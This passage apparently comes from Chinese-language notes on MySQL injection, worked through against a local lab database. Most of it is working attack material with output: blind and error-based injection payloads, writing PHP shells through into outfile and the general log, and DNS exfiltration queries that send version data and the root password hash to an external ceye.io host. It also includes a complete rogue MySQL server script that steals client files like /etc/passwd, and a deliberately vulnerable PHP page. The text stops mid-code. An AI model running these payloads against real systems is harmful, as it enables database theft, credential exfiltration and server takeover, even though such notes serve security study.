如果`group_concat(username)`的首字母的ascii值大于100,则在正常时间内返回结果,如果不大于100,则会延迟一段时间(该时间并不直接等于sleep(0.1),而是与其查询的数据的条目数量相关,`延迟时间 = sleeptime * number`)

```
select * from table1 order by sleep(1)
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
| 2  | tim      | 123456   | tim@qq.com      |
| 3  | mike     | asdfqwer | mike@gmail.com  |
| 4  | mike     | asdfqwer | mike@gmail.com  |
+----+----------+----------+-----------------+
4 rows in set
Time: 4.018s
```

3. 利用`if`进行报错注入

```
mysql root@localhost:sql_injection_test> select * from table1 order by if(1=1,id,username)
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
| 2  | tim      | 123456   | tim@qq.com      |
| 3  | mike     | asdfqwer | mike@gmail.com  |
| 4  | mike     | asdfqwer | mike@gmail.com  |
+----+----------+----------+-----------------+
4 rows in set
Time: 0.009s
mysql root@localhost:sql_injection_test> select * from table1 order by if(1=2,id,username)
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
| 3  | mike     | asdfqwer | mike@gmail.com  |
| 4  | mike     | asdfqwer | mike@gmail.com  |
| 2  | tim      | 123456   | tim@qq.com      |
+----+----------+----------+-----------------+
4 rows in set
Time: 0.008s
```

`order by if(exp,id,username)`

```
mysql root@localhost:sql_injection_test> select * from table1 order by if(1=1,1,(select id from table1))
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
| 2  | tim      | 123456   | tim@qq.com      |
| 3  | mike     | asdfqwer | mike@gmail.com  |
| 4  | mike     | asdfqwer | mike@gmail.com  |
+----+----------+----------+-----------------+
4 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select * from table1 order by if(1=2,1,(select id from table1))
(1242, 'Subquery returns more than 1 row')
mysql root@localhost:sql_injection_test> select * from table1 order by if(length(database())>8,1,(select id from table1))
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
| 2  | tim      | 123456   | tim@qq.com      |
| 3  | mike     | asdfqwer | mike@gmail.com  |
| 4  | mike     | asdfqwer | mike@gmail.com  |
+----+----------+----------+-----------------+
4 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select * from table1 order by if(length(database())<8,1,(select id from table1))
(1242, 'Subquery returns more than 1 row')
```

`order by if((select ascii(substr(@@version,1,1)))>100,1,(select 1 union select 2))`

[记一次真实渗透排序处发现的SQL注入学习](https://www.freebuf.com/articles/web/338744.html)

![](https://img.mi3aka.eu.org/2022/09/97c83b3db2779f3fcffb6fdd69cdc061.png)

4. 利用updatexml等进行报错注入

```
select * from users order by updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,20) from information_schema.schemata),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~information_schema,c~'
```

5. 结合union进行盲注

假定原始语句为`select username,password from table1 where username='$username'`,只对`username`字段进行回显,同时不知道列名,要求获得`admin`的密码

我们可以利用`union`和`order by`进行无列名盲注

```
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin';
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin!@# |
+----------+----------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,2 order by 2
+----------+----------+
| username | password |
+----------+----------+
| 1        | 2        |
| admin    | admin!@# |
+----------+----------+
2 rows in set
Time: 0.011s
```

>加上binary,因为order by不区分大小写

```
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('a') order by 2
+----------+----------+
| username | password |
+----------+----------+
| 1        | a        |
| admin    | admin!@# |
+----------+----------+
2 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('b') order by 2
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin!@# |
| 1        | b        |
+----------+----------+
2 rows in set
Time: 0.009s
```

```
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('ac') order by 2
+----------+----------+
| username | password |
+----------+----------+
| 1        | ac       |
| admin    | admin!@# |
+----------+----------+
2 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('ad') order by 2
+----------+----------+
| username | password |
+----------+----------+
| 1        | ad       |
| admin    | admin!@# |
+----------+----------+
2 rows in set
Time: 0.009s
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('ae') order by 2
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin!@# |
| 1        | ae       |
+----------+----------+
2 rows in set
Time: 0.009s
```

```
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('admin ') order by 2
+----------+----------+
| username | password |
+----------+----------+
| 1        | admin    |
| admin    | admin!@# |
+----------+----------+
2 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('admin!') order by 2
+----------+----------+
| username | password |
+----------+----------+
| 1        | admin!   |
| admin    | admin!@# |
+----------+----------+
2 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('admin"') order by 2
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin!@# |
| 1        | admin"   |
+----------+----------+
2 rows in set
Time: 0.008s
```

## limit注入

1. 有`order by`

mysql中`union`不能在`order by`后面,且一个语句中不能出现多次`order by`

[Mysql下Limit注入方法](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)

[SQL注入：limit注入](https://lyiang.wordpress.com/2015/10/25/sql%E6%B3%A8%E5%85%A5%EF%BC%9Alimit%E6%B3%A8%E5%85%A5/)

以`limit`结尾的sql语句,后面可以接`procedure`或者`into outfile`

`into outfile`主要用来写shell,此处注重应是通过`procedure`读取数据

`procedure`后面接`analyse`,其中要填充两个参数,此处可以利用报错注入或者延时注入

```
mysql root@localhost:mysql> select * from user order by host limit 0,1 procedure analyse(updatexml(1,concat(0x7e,version(),0x7e),1),1);
(1105, "XPATH syntax error: '~5.5.44~'")
mysql root@localhost:mysql> select * from user order by host limit 0,1 procedure analyse(updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1),1);
(1105, "XPATH syntax error: '~information_schema,mysql,perfor'")
```

延时注入,这里不能用`sleep`

`select * from user order by host limit 0,1 PROCEDURE analyse(updatexml(1,IF((select mid(user(),1,1)='r'),BENCHMARK(100000000,1+1),1),1),1)`

---

>判断列数,未验证版本范围

`select * from test.users order by 1 limit 0,1 into @a,@b,@c,@d;`

当列数与`@`的数量相同时,sql语句才能够正常执行,利用这一点可以获取列的数量

![](https://img.mi3aka.eu.org/2022/09/9f496313d87adf9e9e6074bb664d5acd.png)

2. 无`order by`

直接用`union`即可,存在版本限制(未验证版本范围)

```
mysql root@localhost:mysql> select @@version;
+-----------+
| @@version |
+-----------+
| 5.5.47    |
+-----------+
1 row in set
Time: 0.008s
mysql root@localhost:mysql> select host from user limit 0,1 union select user from user;
+------+
| host |
+------+
| %    |
| root |
+------+
2 rows in set
Time: 0.009s
```

```
mysql root@localhost:mysql> select @@version;
+-----------+
| @@version |
+-----------+
| 5.7.36    |
+-----------+
1 row in set
Time: 0.007s
mysql root@localhost:mysql> select host from user limit 0,1 union select user from user;
(1221, 'Incorrect usage of UNION and LIMIT')
mysql root@localhost:mysql> (select host from user limit 0,1) union (select user from user);
+---------------+
| host          |
+---------------+
| %             |
| root          |
| mysql.session |
| mysql.sys     |
+---------------+
4 rows in set
Time: 0.008s
```

## between and注入

`between and`可以`=,<,>,like,regexp`被过滤的情况下使用

>取值范围说明

```
mysql root@localhost:sql_injection_test> select 'b' between 'a' and 'c'
+-------------------------+
| 'b' between 'a' and 'c' |
+-------------------------+
| 1                       |
+-------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select 'b' between 'b' and 'c'
+-------------------------+
| 'b' between 'b' and 'c' |
+-------------------------+
| 1                       |
+-------------------------+
1 row in set
Time: 0.007s
mysql root@localhost:sql_injection_test> select 'b' between 'a' and 'b'
+-------------------------+
| 'b' between 'a' and 'b' |
+-------------------------+
| 1                       |
+-------------------------+
1 row in set
Time: 0.007s
```

```
mysql root@localhost:sql_injection_test> select 'bb' between 'a' and 'c'
+--------------------------+
| 'bb' between 'a' and 'c' |
+--------------------------+
| 1                        |
+--------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select 'bb' between 'a' and 'b'
+--------------------------+
| 'bb' between 'a' and 'b' |
+--------------------------+
| 0                        |
+--------------------------+
1 row in set
Time: 0.007s
mysql root@localhost:sql_injection_test> select 'bb' between 'b' and 'c'
+--------------------------+
| 'bb' between 'b' and 'c' |
+--------------------------+
| 1                        |
+--------------------------+
1 row in set
Time: 0.008s
```

单字符时取值范围为`[min,max]`,多字符时取值范围为`[min,max)`

>实际场景

```
mysql root@localhost:sql_injection_test> select user()
+-----------------+
| user()          |
+-----------------+
| root@172.18.0.1 |
+-----------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select user() between 'q' and 'z'
+----------------------------+
| user() between 'q' and 'z' |
+----------------------------+
| 1                          |
+----------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select user() between 'r' and 'z'
+----------------------------+
| user() between 'r' and 'z' |
+----------------------------+
| 1                          |
+----------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select user() between 's' and 'z'
+----------------------------+
| user() between 's' and 'z' |
+----------------------------+
| 0                          |
+----------------------------+
1 row in set
Time: 0.013s
```

可以得知`user()`第一个字母为`r`

---

```
mysql root@localhost:sql_injection_test> select group_concat(username) from table1
+------------------------+
| group_concat(username) |
+------------------------+
| admin,tim,mike,mike    |
+------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select (select substr(group_concat(username),1,1) from table1);
+---------------------------------------------------------+
| (select substr(group_concat(username),1,1) from table1) |
+---------------------------------------------------------+
| a                                                       |
+---------------------------------------------------------+
1 row in set
Time: 0.007s
mysql root@localhost:sql_injection_test> select (select substr(group_concat(username),1,1) from table1) between 'a' and 'a';
+-----------------------------------------------------------------------------+
| (select substr(group_concat(username),1,1) from table1) between 'a' and 'a' |
+-----------------------------------------------------------------------------+
| 1                                                                           |
+-----------------------------------------------------------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select (select substr(group_concat(username),1,1) from table1) between 'b' and 'b';
+-----------------------------------------------------------------------------+
| (select substr(group_concat(username),1,1) from table1) between 'b' and 'b' |
+-----------------------------------------------------------------------------+
| 0                                                                           |
+-----------------------------------------------------------------------------+
1 row in set
Time: 0.007s
```

可以用16进制代替字符串

```
mysql root@localhost:sql_injection_test> select user() between 0x61 and 0x7a # between 'a' and 'z'
+------------------------------+
| user() between 0x61 and 0x7a |
+------------------------------+
| 1                            |
+------------------------------+
1 row in set
Time: 0.010s
mysql root@localhost:sql_injection_test> select user() between 0x726f and 0x727a # between 'ro' and 'rz'
+----------------------------------+
| user() between 0x726f and 0x727a |
+----------------------------------+
| 1                                |
+----------------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select user() between 0x7270 and 0x727a # between 'rp' and 'rz'
+----------------------------------+
| user() between 0x7270 and 0x727a |
+----------------------------------+
| 0                                |
+----------------------------------+
1 row in set
Time: 0.010s
```

>例子

```
mysql root@localhost:sql_injection_test> select * from table1 where id='-1' or if((select(select group_concat(username) from table1) between 'a' and 'z'),1,0)
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
| 2  | tim      | 123456   | tim@qq.com      |
| 3  | mike     | asdfqwer | mike@gmail.com  |
| 4  | mike     | asdfqwer | mike@gmail.com  |
+----+----------+----------+-----------------+
4 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select * from table1 where id='-1' or if((select(select group_concat(username) from table1) between 'z' and 'z'),1,0)
+----+----------+----------+-------+
| id | username | password | email |
+----+----------+----------+-------+
0 rows in set
Time: 0.008s
```

## 文件读写

`file_priv`是表示用户的文件读写权限,查询方式`select file_priv,host,user from mysql.user`

`secure_file_priv`表示mysql的读写权限,注意与`file_priv`区分

查询方式

```
select @@secure_file_priv;
select @@global.secure_file_priv;
show variables like "secure_file_priv";
```

>注意区分空值和NULL

- 空值即无限制
- 为`NULL`表示禁止文件读写
- 为目录名表示读写操作仅在该目录进行

```
mysql root@localhost:(none)> select @@version;
+-----------+
| @@version |
+-----------+
| 5.5.44    |
+-----------+
1 row in set
Time: 0.007s
mysql root@localhost:(none)> select file_priv,host,user from mysql.user
+-----------+------+------+
| file_priv | host | user |
+-----------+------+------+
| Y         | %    | root |
+-----------+------+------+
1 row in set
Time: 0.010s
mysql root@localhost:(none)> select @@secure_file_priv;
+--------------------+
| @@secure_file_priv |
+--------------------+
| <null>             |
+--------------------+
1 row in set
Time: 0.007s
mysql root@localhost:(none)> select @@global.secure_file_priv;
+---------------------------+
| @@global.secure_file_priv |
+---------------------------+
| <null>                    |
+---------------------------+
1 row in set
Time: 0.011s
mysql root@localhost:(none)> show variables like "secure_file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set
Time: 0.012s
```

### 读文件

`select load_file("/etc/passwd")`路径必须是绝对路径,同时要注意文件大小限制

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202021155836.png)

- 利用`LOAD DATA INFILE`进行文件读取

[Mysql Client 任意文件读取攻击链拓展](https://lengjibo.github.io/mysqlc/)

[恶意MySQL Server读取MySQL Client端文件](http://blog.nsfocus.net/malicious-mysql-server-reads-mysql-client-files/)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204222134687.png)

[利用脚本](https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py)

>需要对这个脚本的`Server Greeting`进行一定的修改

```python
# -*- coding: UTF-8 -*-
import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers



PORT = 3306

log = logging.getLogger(__name__)

log.setLevel(logging.DEBUG)
tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
log.addHandler(
    tmp_format
)

filelist = (
#    r'c:\boot.ini',
#    r'c:\windows\win.ini',
#    r'c:\windows\system32\drivers\etc\hosts',
   '/etc/passwd',
#    '/etc/shadow',
)


#================================================
#=======No need to change after this lines=======
#================================================

__author__ = 'Gifts'

def daemonize():
    import os, warnings
    if os.name != 'posix':
        warnings.warn('Cant create daemon on non-posix system')
        return

    if os.fork(): os._exit(0)
    os.setsid()
    if os.fork(): os._exit(0)
    os.umask(0o022)
    null=os.open('/dev/null', os.O_RDWR)
    for i in xrange(3):
        try:
            os.dup2(null, i)
        except OSError as e:
            if e.errno != 9: raise
    os.close(null)


class LastPacket(Exception):
    pass


class OutOfOrder(Exception):
    pass


class mysql_packet(object):
    packet_header = struct.Struct('<Hbb')
    packet_header_long = struct.Struct('<Hbbb')
    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
        else:
            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)

        result = "{0}{1}".format(
            header,
            self.payload
        )
        return result

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = ord(raw_data[0])
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)


class http_request_handler(asynchat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.logined = False
        # self.push(
        #     mysql_packet(
        #         0,
        #         "".join((
        #             '\x0a',  # Protocol
        #             '3.0.0-Evil_Mysql_Server' + '\0',  # Version
        #             #'5.1.66-0+squeeze1' + '\0',
        #             '\x36\x00\x00\x00',  # Thread ID
        #             'evilsalt' + '\0',  # Salt
        #             '\xdf\xf7',  # Capabilities
        #             '\x08',  # Collation
        #             '\x02\x00',  # Server Status
        #             '\0' * 13,  # Unknown
        #             'evil2222' + '\0',
        #         ))
        #     )
        # )
        # 这个Server Greeting太老了
        self.push(
            mysql_packet(
                0,
                "".join((
                    '\x0a',
                    '5.7.37-log' + '\0',
                    '\x02\x00\x00\x00',
                    '\x2b\x3a\x31\x7a\x22\x72\x64\x4f\x00',
                    '\xff\xf7',# 关闭ssl .... 0... .... .... = Switch to SSL after handshake: Not set
                    '\x2d',
                    '\x02\x00',
                    '\xff\xc1',
                    '\x15',
                    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                    '\x6b\x66\x64\x01\x4c\x1e\x0a\x5f\x79\x0d\x27\x5b\x00',
                    'mysql_native_password' + '\0',
                ))
            )
        )
        self.order = 1
        self.states = ['LOGIN', 'CAPS', 'ANY']

    def push(self, data):
        log.debug('Pushed: %r', data)
        data = str(data)
        asynchat.async_chat.push(self, data)

    def collect_incoming_data(self, data):
        log.debug('Data recved: %r', data)
        self.ibuffer.append(data)

    def found_terminator(self):
        data = "".join(self.ibuffer)
        self.ibuffer = []

        if self.state == 'LEN':
            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'
        elif self.state == 'MoreLength':
            if data[0] != '\0':
                self.push(None)
                self.close_when_done()
            else:
                self.state = 'Data'
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    # Fix ?
                    self.order = packet.packet_num + 2
                if packet.packet_num == 0:
                    if packet.payload[0] == '\x03':
                        log.info('Query')

                        filename = random.choice(filelist)
                        PACKET = mysql_packet(
                            packet,
                            '\xFB{0}'.format(filename)
                        )
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET)
                    elif packet.payload[0] == '\x1b':
                        log.info('SelectDB')
                        self.push(mysql_packet(
                            packet,
                            '\xfe\x00\x00\x02\x00'
                        ))
                        raise LastPacket()
                    elif packet.payload[0] in '\x02':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    elif packet.payload == '\x00\x01':
                        self.push(None)
                        self.close_when_done()
                    else:
                        raise ValueError()
                else:
                    if self.sub_state == 'File':
                        log.info('-- result')
                        log.info('Result: %r', data)

                        if len(data) == 1:
                            self.push(
                                mysql_packet(packet, '\0\0\0\x02\0\0\0')
                            )
                            raise LastPacket()
                        else:
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.order = packet.packet_num + 1

                    elif self.sub_state == 'Auth':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    else:
                        log.info('-- else')
                        raise ValueError('Unknown packet')
            except LastPacket:
                log.info('Last packet')
                self.state = 'LEN'
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            except OutOfOrder:
                log.warning('Out of order')
                self.push(None)
                self.close_when_done()
        else:
            log.error('Unknown state')
            self.push('None')
            self.close_when_done()


class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind(('', PORT))
            except socket.error:
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info('Conn from: %r', pair[1])
            tmp = http_request_handler(pair)


z = mysql_listener()
daemonize()
asyncore.loop()
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204231543156.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204231544750.png)

### 写文件

`select "payload" into outfile/dumpfile 'filename'`路径必须是绝对路径

```
mysql root@localhost:mysql> select "<?php ?>" into outfile '/tmp/a.php';
Query OK, 1 row affected
Time: 0.001s
mysql root@localhost:mysql> select load_file("/tmp/a.php")
+-------------------------+
| load_file("/tmp/a.php") |
+-------------------------+
| <?php ?>                |
|                         |
+-------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:mysql> select "<?php ?>" into dumpfile '/tmp/b.php';
Query OK, 1 row affected
Time: 0.001s
mysql root@localhost:mysql> select load_file("/tmp/b.php")
+-------------------------+
| load_file("/tmp/b.php") |
+-------------------------+
| <?php ?>                |
+-------------------------+
1 row in set
Time: 0.007s
```

可以通过日志文件进行getshell

[slow_query_log_file](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_slow_query_log_file)

[general_log_file](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_general_log_file)

```
mysql root@localhost:mysql> show variables like "%slow_query_log%";
+---------------------+--------------------------------------+
| Variable_name       | Value                                |
+---------------------+--------------------------------------+
| slow_query_log      | OFF                                  |
| slow_query_log_file | /var/lib/mysql/04a8b4d57324-slow.log |
+---------------------+--------------------------------------+
2 rows in set
Time: 0.010s
mysql root@localhost:mysql> show variables like "%general_log%";
+------------------+---------------------------------+
| Variable_name    | Value                           |
+------------------+---------------------------------+
| general_log      | OFF                             |
| general_log_file | /var/lib/mysql/04a8b4d57324.log |
+------------------+---------------------------------+
2 rows in set
Time: 0.013s
```

```
mysql root@localhost:(none)> show global variables like '%general%';
+------------------+---------------------------------+
| Variable_name    | Value                           |
+------------------+---------------------------------+
| general_log      | OFF                             |
| general_log_file | /var/lib/mysql/f6b222ea5020.log |
+------------------+---------------------------------+
2 rows in set
Time: 0.011s
mysql root@localhost:(none)> set global general_log_file="/tmp/log.php"
Query OK, 0 rows affected
Time: 0.001s
mysql root@localhost:(none)> set global general_log=1
Query OK, 0 rows affected
Time: 0.002s
mysql root@localhost:(none)> show global variables like '%general%';
+------------------+--------------+
| Variable_name    | Value        |
+------------------+--------------+
| general_log      | ON           |
| general_log_file | /tmp/log.php |
+------------------+--------------+
2 rows in set
Time: 0.011s
```

```
mysql root@localhost:mysql> select host from `user` union select "<?php phpinfo();?>"
+--------------------+
| host               |
+--------------------+
| %                  |
| <?php phpinfo();?> |
+--------------------+
2 rows in set
Time: 0.008s
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202021353680.png)

## dnslog外带数据

只能够在windows上进行,利用了windows的[UNC](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths)

|Path|Description|
|:---:|:---:|
|`\\system07\C$\`|The root directory of the C: drive on system07.|
|`\\Server2\Share\Test\Foo.txt`|The Foo.txt file in the Test directory of the `\\Server2\Share volume`.|

```
MySQL root@localhost:(none)> select @@version;
+-----------+
| @@version |
+-----------+
| 5.5.44    |
+-----------+
1 row in set
Time: 0.016s
MySQL root@localhost:(none)> show variables like "%file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set
Time: 0.000s
MySQL root@localhost:(none)> select file_priv,host,user from mysql.user;
+-----------+-----------+------+
| file_priv | host      | user |
+-----------+-----------+------+
| Y         | localhost | root |
| Y         | 127.0.0.1 | root |
| Y         | ::1       | root |
| N         | localhost |      |
+-----------+-----------+------+
4 rows in set
Time: 0.000s
```

>注意`.ckr3de.ceye.io`最前面有一个`.`

```
MySQL root@localhost:(none)> SELECT LOAD_FILE(concat('\\\\',@@version,'.ckr3de.ceye.io\\abc'));
+------------------------------------------------------------+
| LOAD_FILE(concat('\\\\',@@version,'.ckr3de.ceye.io\\abc')) |
+------------------------------------------------------------+
| <null>                                                     |
+------------------------------------------------------------+
1 row in set
Time: 22.625s
MySQL root@localhost:(none)> SELECT LOAD_FILE(concat('\\\\',(select group_concat(schema_name SEPARATOR '.') from information_schema.schemata),'.ckr3de.ceye.io\\abc'));
+------------------------------------------------------------------------------------------------------------------------------------+
| LOAD_FILE(concat('\\\\',(select group_concat(schema_name SEPARATOR '.') from information_schema.schemata),'.ckr3de.ceye.io\\abc')) |
+------------------------------------------------------------------------------------------------------------------------------------+
| <null>                                                                                                                             |
+------------------------------------------------------------------------------------------------------------------------------------+
1 row in set
Time: 22.297s
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202022158588.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202022155693.png)

[官方payload](http://ceye.io/payloads)

`SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));`

## 字符集漏洞

[Mysql-字符集漏洞分析](https://lalajun.github.io/2018/05/11/mysql-%E5%AD%97%E7%AC%A6%E9%9B%86%E6%BC%8F%E6%B4%9E/)

在php中,常用以下语句来设置php客户端在Mysql中的字符集`set names utf8`

这个语句会修改如下几项客户端设置

```
character_set_client=utf8
character_set_connection=utf8
character_set_results=utf8
```

然而如下服务端设置不会修改

```
character_set_database
character_set_server
character_set_filesysytem
character_set_system
```

这样就造成了服务端与客户端的字符集不匹配,从而造成字符集转换漏洞

当我们的mysql接受到客户端的数据后,会认为他的编码是`character_set_client`,然后会将之将换成`character_set_connection`的编码

进入具体表和字段后,再转换成字段对应的编码,当查询结果产生后,会从表和字段的编码,转换成`character_set_results`编码,返回给客户端

### GBK编码注入

php编码为`UTF-8`而mysql编码为`gbk`,在php向mysql传递数据时会产生编码转换从而导致注入

通过`set names 'gbk';`将mysql编码设置成`gbk`

```
version: '3.8'
services:
  mysql44:
    image: mysql:5.5.44
    container_name: mysql-44
    ports:
      - "4400:3306"
    environment:
      MYSQL_ROOT_PASSWORD: root
    command: --character-set-server=gbk --collation-server=gbk_bin
```

```
sql_injection_test> show variables like '%char%'
+--------------------------+----------------------------------+
| Variable_name            | Value                            |
+--------------------------+----------------------------------+
| character_set_client     | utf8                             |
| character_set_connection | utf8                             |
| character_set_database   | gbk                              |
| character_set_filesystem | binary                           |
| character_set_results    | utf8                             |
| character_set_server     | gbk                              |
| character_set_system     | utf8                             |
| character_sets_dir       | /usr/local/mysql/share/charsets/ |
+--------------------------+----------------------------------+
8 rows in set
Time: 0.008s
sql_injection_test> set names 'gbk';
Query OK, 0 rows affected
Time: 0.001s
sql_injection_test> show variables like '%char%'
+--------------------------+----------------------------------+
| Variable_name            | Value                            |
+--------------------------+----------------------------------+
| character_set_client     | gbk                              |
| character_set_connection | gbk                              |
| character_set_database   | gbk                              |
| character_set_filesystem | binary                           |
| character_set_results    | gbk                              |
| character_set_server     | gbk                              |
| character_set_system     | utf8                             |
| character_sets_dir       | /usr/local/mysql/share/charsets/ |
+--------------------------+----------------------------------+
8 rows in set
Time: 0.009s
```

```
' -> 0x27
\ -> 0x5c
```

`addslashes`将`'`转义为`\'`,假设此时传入一个`\u8827`的utf8字符其URL编码为`%88%27`,那么经过`addslashes`后得到`%88%5c%27`

此时mysql以gbk进行编码,`%88%5c`被理解成`圽`这个汉字,而`%27`即`'`成功逃逸

>示例

```
sql_injection_test> select * from `user`;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 1  | admin    | admin123 |
| 2  | test     | test     |
+----+----------+----------+
2 rows in set
Time: 0.008s
```

```php
<?php
highlight_file(__FILE__);
$db = new mysqli("192.168.92.128", "root", "root", "sql_injection_test", "4400");
if (mysqli_connect_errno()) { #检查连接
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}
if (empty($_GET['username'])) {
    exit();
}
$username = addslashes($_GET['username']);
var_dump($username);
$query = "select * from user where username = '$username';";
$result = $db->query($query);
var_dump($result->fetch_all());
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031342232.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031342995.png)

`'error' => string 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''�\''' at line 1' (length=151)`

可以看到`'`成功逃逸,引起了mysql的报错

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031343300.png)

还有另一种思路即将`\'`转换成`\\'`,造成缺少`'`语句无法正常闭合

我们传入`%88%5c`,经过`addslashes`后转换成`%88%5c%5c`,即`username='%88\\'

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031350182.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031351361.png)

`'error' => string 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''�\\'' at line 1' (length=151)`

可以看到缺少`'`导致语句无法闭合,引起了mysql的报错

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031352322.png)

### iconv

在使用`iconv`进行编码转换时会产生注入

`iconv(string $in_charset, string $out_charset, string $str): string`

将字符串`str`从`in_charset`转换编码到`out_charset`

1. `UTF-8`转`GBK`

```php
<?php
highlight_file(__FILE__);
$db = new mysqli("192.168.92.128", "root", "root", "sql_injection_test", "4400");
if (mysqli_connect_errno()) { #检查连接
